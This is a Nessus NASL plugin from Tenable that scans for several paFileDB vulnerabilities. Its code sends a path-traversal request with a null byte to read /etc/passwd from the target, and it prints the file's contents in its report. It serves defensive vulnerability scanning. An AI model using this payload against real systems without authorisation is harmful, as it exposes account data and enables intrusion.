#
# (C) Tenable Network Security


  desc = "
Synopsis :

The remote web server contains a PHP application that is affected by
multiple vulnerabilities. 

Description :

The remote host is running a version of paFileDB that is prone to a wide
variety of vulnerabilities, including arbitrary file uploads, local
file inclusion, SQL injection, and cross-site scripting issues.

See also :

http://marc.theaimsgroup.com/?l=bugtraq&m=110720365923818&w=2

Solution : 

Upgrade to the latest version from PHP Arena.  Note that fix released
31-Mar-2005 does not change the version number. 

Risk factor : 

Medium / CVSS Base Score : 6
(AV:R/AC:H/Au:NR/C:P/A:P/I:P/B:N)";


if (description) {
  script_id(11806);
  script_version ("$Revision: 1.13 $");

  script_cve_id(
    "CVE-2004-1219",
    "CVE-2004-1551",
    "CVE-2005-0326",
    "CVE-2005-0327",
    "CVE-2005-0723",
    "CVE-2005-0724"
  );
  script_bugtraq_id(7183, 8271, 10229, 11817, 11818, 12758, 12788, 12952);
  if (defined_func("script_xref")) {
    script_xref(name:"OSVDB", value:"5695");
    script_xref(name:"OSVDB", value:"5695");
    script_xref(name:"OSVDB", value:"12263");
    script_xref(name:"OSVDB", value:"12264");
    script_xref(name:"OSVDB", value:"12265");
    script_xref(name:"OSVDB", value:"12266");
    script_xref(name:"OSVDB", value:"13494");
    script_xref(name:"OSVDB", value:"13495");
    script_xref(name:"OSVDB", value:"14684");
    script_xref(name:"OSVDB", value:"14685");
    script_xref(name:"OSVDB", value:"14686");
    script_xref(name:"OSVDB", value:"14687");
    script_xref(name:"OSVDB", value:"14688");
  }
 
  script_name(english:"Multiple Vulnerabilities in paFileDB 3.1 and older");
  script_summary(english:"Checks for multiple vulnerabilities in paFileDB 3.1 and Older");

  script_description(english:desc);
 
  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2003-2006 Tenable Network Security");

  script_dependencies("pafiledb_detect.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");


port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);
if (!can_host_php(port:port)) exit(0);


# Test an install.
install = get_kb_item(string("www/", port, "/pafiledb"));
if (isnull(install)) exit(0);
matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");
if (!isnull(matches)) {
  dir = matches[2];

  # Try to exploit one of the flaws to read a file.
  file = "../../../../../../../../../../etc/passwd%00";
  req = http_get(
    item:string(
      dir, "/pafiledb.php?",
      "login=do&",
      "action=", file
    ),
    port:port
  );
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
  if (res == NULL) exit(0);

  # There's a problem if...
  if (
    # there's an entry for root or...
    egrep(pattern:"root:.*:0:[01]:", string:res) ||
    # we get an error saying "failed to open stream".
    #
    # nb: this suggests magic_quotes_gpc was enabled but an attacker with
    #     local access might still work or...
    egrep(pattern:"main\(.+/etc/passwd\\0/login\.php.+ failed to open stream", string:res) ||
    # we get an error claiming the file doesn't exist or...
    egrep(pattern:"main\(.+/etc/passwd\).*: failed to open stream: No such file
or directory", string:res) ||
    # we get an error about open_basedir restriction.
    egrep(pattern:"main.+ open_basedir restriction in effect. File\(.+/etc/passwd", string:res)
  )
  {
    if (egrep(string:res, pattern:"root:.*:0:[01]:"))
      report = string(
        desc,
        "\n\n",
        "Plugin output :\n",
        "\n",
        "Here are the contents of the file '/etc/passwd' that Nessus\n",
        "was able to read from the remote host :\n",
        "\n",
        res
      );
    else report = desc;

    security_warning(port:port, data:report);
    exit(0);
  }
}
